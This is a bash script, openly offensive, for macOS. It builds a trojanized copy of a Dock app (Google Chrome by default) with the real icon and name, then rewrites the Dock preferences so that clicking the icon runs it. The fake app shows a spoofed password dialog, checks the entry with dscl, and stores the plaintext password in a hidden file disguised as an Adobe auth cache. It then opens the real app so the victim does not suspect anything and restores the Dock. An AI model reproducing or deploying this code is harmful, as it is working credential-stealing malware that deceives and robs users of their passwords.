#!/bin/bash
# Dock Impersonation — Replace a Dock app with trojanized .app bundle
# When user clicks the Dock icon, our payload runs (shows cred prompt)
# then launches the real app transparently.
#
# MITRE: T1574.009 (Path Interception by Unquoted Path), T1056.002 (GUI Input Capture)

USER=$(whoami)
OUTFILE="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"
TARGET_APP="${1:-/Applications/Google Chrome.app}"
STASH_DIR="$HOME/.local/share/.dock_stash"

# ============================================================
# Phase 1: Extract Target App Info
# ============================================================

TARGET_NAME=$(basename "$TARGET_APP" .app)
TARGET_BUNDLE_ID=$(/usr/libexec/PlistBuddy -c "Print CFBundleIdentifier" "$TARGET_APP/Contents/Info.plist" 2>/dev/null)
TARGET_ICON=$(/usr/libexec/PlistBuddy -c "Print CFBundleIconFile" "$TARGET_APP/Contents/Info.plist" 2>/dev/null)
TARGET_EXEC=$(/usr/libexec/PlistBuddy -c "Print CFBundleExecutable" "$TARGET_APP/Contents/Info.plist" 2>/dev/null)

echo "$TARGET_ICON" | grep -q "\.icns$" || TARGET_ICON="${TARGET_ICON}.icns"

if [ ! -d "$TARGET_APP" ]; then
    echo "[-] Target app not found: $TARGET_APP"
    exit 1
fi

# ============================================================
# Phase 2: Create Trojanized App Bundle
# ============================================================

TROJAN_APP="$STASH_DIR/${TARGET_NAME}.app"
mkdir -p "$TROJAN_APP/Contents/MacOS"
mkdir -p "$TROJAN_APP/Contents/Resources"

# Copy the real app's icon
if [ -f "$TARGET_APP/Contents/Resources/$TARGET_ICON" ]; then
    cp "$TARGET_APP/Contents/Resources/$TARGET_ICON" "$TROJAN_APP/Contents/Resources/"
fi

# Create Info.plist matching the original
cat > "$TROJAN_APP/Contents/Info.plist" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>$TARGET_NAME</string>
    <key>CFBundleDisplayName</key>
    <string>$TARGET_NAME</string>
    <key>CFBundleIdentifier</key>
    <string>${TARGET_BUNDLE_ID}.helper</string>
    <key>CFBundleExecutable</key>
    <string>$TARGET_EXEC</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleIconFile</key>
    <string>$TARGET_ICON</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>NSHighResolutionCapable</key>
    <true/>
</dict>
</plist>
PLIST

# The trojan executable — shows prompt then launches real app
cat > "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC" << 'EXEC'
#!/bin/bash
REAL_APP="__REAL_APP_PATH__"
USER=$(whoami)
OUTFILE="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"

# Show credential prompt using the app's identity
PW=$(/usr/bin/osascript << 'AS'
tell application "System Events"
    activate
    set userPassword to text returned of (display dialog ¬
        "__APP_NAME__ needs your password to verify your identity." & return & return & ¬
        "An update requires authentication to continue." ¬
        default answer "" ¬
        with hidden answer ¬
        buttons {"Cancel", "OK"} ¬
        default button "OK" ¬
        with icon caution ¬
        with title "__APP_NAME__")
    return userPassword
end tell
AS
)

if [ -n "$PW" ]; then
    if dscl . -authonly "$USER" "$PW" 2>/dev/null; then
        mkdir -p "$(dirname "$OUTFILE")"
        echo "$(date -u +%Y-%m-%dT%H:%M:%SZ)|$USER|$PW|dock_impersonate:__APP_NAME__" >> "$OUTFILE"
        chmod 600 "$OUTFILE"
    fi
fi

# Launch the real app so user doesn't suspect anything
open "$REAL_APP"

# Self-restore: put the real app back in the Dock after first capture
# This is a one-shot technique
sleep 5
__RESTORE_CMD__
EXEC

# Replace placeholders
sed -i '' "s|__REAL_APP_PATH__|$TARGET_APP|g" "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC" 2>/dev/null || \
    sed -i "s|__REAL_APP_PATH__|$TARGET_APP|g" "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC"
sed -i '' "s|__APP_NAME__|$TARGET_NAME|g" "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC" 2>/dev/null || \
    sed -i "s|__APP_NAME__|$TARGET_NAME|g" "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC"

chmod +x "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC"

# ============================================================
# Phase 3: Swap Dock Entry
# ============================================================

DOCK_PLIST="$HOME/Library/Preferences/com.apple.dock.plist"

# Find the target app's position in the Dock
DOCK_INDEX=$(/usr/libexec/PlistBuddy -c "Print persistent-apps" "$DOCK_PLIST" 2>/dev/null | \
    grep -n "$TARGET_APP" | head -1 | cut -d: -f1)

if [ -z "$DOCK_INDEX" ]; then
    echo "[-] App not found in Dock: $TARGET_NAME"
    echo "[*] Try adding it to the Dock first, or use a different target."
    rm -rf "$TROJAN_APP"
    exit 1
fi

# Replace the Dock entry with our trojan
# Note: This modifies the Dock plist directly
/usr/libexec/PlistBuddy -c "Set persistent-apps:$((DOCK_INDEX-1)):tile-data:file-data:_CFURLString file://$TROJAN_APP/" "$DOCK_PLIST" 2>/dev/null

# Add restore command to trojan
RESTORE_CMD="/usr/libexec/PlistBuddy -c 'Set persistent-apps:$((DOCK_INDEX-1)):tile-data:file-data:_CFURLString file://$TARGET_APP/' '$DOCK_PLIST' 2>/dev/null; killall Dock"
sed -i '' "s|__RESTORE_CMD__|$RESTORE_CMD|g" "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC" 2>/dev/null || \
    sed -i "s|__RESTORE_CMD__|$RESTORE_CMD|g" "$TROJAN_APP/Contents/MacOS/$TARGET_EXEC"

# ============================================================
# Phase 4: Reload Dock
# ============================================================

echo "[*] Reloading Dock (brief visual flash)..."
killall Dock

echo "[+] Dock swapped: $TARGET_NAME → trojan"
echo "[*] When user clicks '$TARGET_NAME' in Dock, credential prompt appears"
echo "[*] After capture, real app launches and Dock is restored"
